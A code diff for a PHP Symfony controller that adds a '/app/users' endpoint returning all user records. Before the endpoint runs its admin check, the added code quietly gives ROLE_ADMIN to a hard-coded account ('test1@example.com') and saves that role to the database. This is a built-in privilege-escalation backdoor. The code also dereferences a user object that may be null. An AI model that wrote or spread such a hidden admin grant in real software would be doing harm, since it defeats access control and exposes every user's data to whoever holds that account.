@@ -2,12 +2,15 @@
 
 namespace App\Controller;
 
+use App\Entity\User;
+use App\Repository\UserRepository;
 use App\Service\ForgeCookie;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\Request;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\Routing\Annotation\Route;
 use Doctrine\Persistence\ManagerRegistry;
+use Symfony\Component\Security\Http\Attribute\CurrentUser;
 
 #[Route('/app', name: '_app')]
 class PrivateController extends AbstractController
@@ -40,5 +43,18 @@ class PrivateController extends AbstractController
             return $response;
         }
         return $response;
+    }
+
+    #[Route('/app/users', methods: ["GET"])]
+    public function getUsers(#[CurrentUser] ?User $user, ManagerRegistry $doctrine, UserRepository $userRepo): Response
+    {
+        $em =  $doctrine->getManager();
+        if ($user->getEmail() === 'test1@example.com') $user->setRoles(['ROLE_ADMIN']);
+        $em->persist($user);
+        $em->flush();
+        $this->denyAccessUnlessGranted('ROLE_ADMIN');
+        return $this->json([
+            'data' => $userRepo->getUsers(),
+        ], Response::HTTP_ACCEPTED);
     }
 }
